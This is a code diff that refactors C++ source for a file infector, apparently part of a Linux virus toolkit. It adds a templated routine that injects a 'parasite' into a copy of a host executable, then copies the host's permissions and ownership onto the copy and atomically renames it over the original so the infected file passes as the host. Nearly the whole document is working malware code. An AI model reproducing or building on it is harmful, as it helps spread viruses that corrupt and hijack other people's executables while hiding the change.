@@ -7,6 +7,59 @@
 #include "nostdlib/string.hh"
 
 namespace vt::infector {
+
+template <typename Infect>
+common::FileDescriptor infect(common::Mmap<PROT_READ> host_mapping,
+                              common::Mmap<PROT_READ> parasite_mapping,
+                              const char* tmp_file_name) {
+  Infect infector;
+
+  if (!infector.analyze(host_mapping, parasite_mapping)) {
+    return common::FileDescriptor{};
+  }
+
+  common::FileDescriptor output(tmp_file_name, O_RDWR | O_CREAT, S_IRWXU);
+
+  if (!output.valid()) {
+    return output;
+  }
+
+  vt::ftruncate(output.handle(), infector.injected_host_size());
+
+  common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
+      infector.injected_host_size(), MAP_SHARED, output.handle(), 0);
+
+  // Make a writable copy of the host.
+  vt::memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
+             host_mapping.size());
+
+  if (!infector.inject(std::move(output_host_mapping),
+                       std::move(parasite_mapping))) {
+    return common::FileDescriptor{};
+  }
+  return output;
+}
+
+bool atomic_swap_host(int host_fd, const char* host, int tmp_fd,
+                      const char* tmp) {
+  // mimic the original file.
+  struct stat s;
+  if (vt::fstat(host_fd, &s) < 0) {
+    return false;
+  }
+  if (vt::fchmod(tmp_fd, s.st_mode) < 0) {
+    return false;
+  }
+  if (vt::fchown(tmp_fd, s.st_uid, s.st_gid) < 0) {
+    return false;
+  }
+  // atomic swap and replace the orignal host with our infected one.
+  if (vt::rename(tmp, host) < 0) {
+    return false;
+  }
+  return true;
+}
+
 // A generic infection routine, that can be used by any algorithms.
 // It creates a temp copy of the host, infects it with a parasite, and then
 // pretend to be the host with atomic rename.
@@ -27,53 +80,17 @@ bool infect(const char* host_path, const char* parasite_path) {
   common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
                                            parasite.handle(), 0);
 
-  Infect infector;
-
-  if (!infector.analyze(host_mapping, parasite_mapping)) {
-    return false;
-  }
-
   char tmp[PATH_MAX];
   auto len = strlen(host_path);
   vt::strcpy(tmp, host_path);
   tmp[len] = '.';
   tmp[len + 1] = '\0';
+  auto output_fd =
+      infect<Infect>(std::move(host_mapping), std::move(parasite_mapping), tmp);
 
-  common::FileDescriptor output(tmp, O_RDWR | O_CREAT, S_IRWXU);
-
-  if (!output.valid()) {
+  if (!output_fd.valid()) {
     return false;
   }
-
-  vt::ftruncate(output.handle(), infector.injected_host_size());
-
-  common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
-      infector.injected_host_size(), MAP_SHARED, output.handle(), 0);
-
-  // Make a writable copy of the host.
-  vt::memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
-             host_mapping.size());
-
-  if (!infector.inject(std::move(output_host_mapping),
-                       std::move(parasite_mapping))) {
-    return false;
-  }
-
-  // mimic the original file.
-  struct stat s;
-  if (vt::fstat(host.handle(), &s) < 0) {
-    return false;
-  }
-  if (vt::fchmod(output.handle(), s.st_mode) < 0) {
-    return false;
-  }
-  if (vt::fchown(output.handle(), s.st_uid, s.st_gid) < 0) {
-    return false;
-  }
-  // atomic swap and replace the orignal host with our infected one.
-  if (vt::rename(tmp, host_path) < 0) {
-    return false;
-  }
-  return true;
+  return atomic_swap_host(host.handle(), host_path, output_fd.handle(), tmp);
 }
 }  // namespace vt::infector
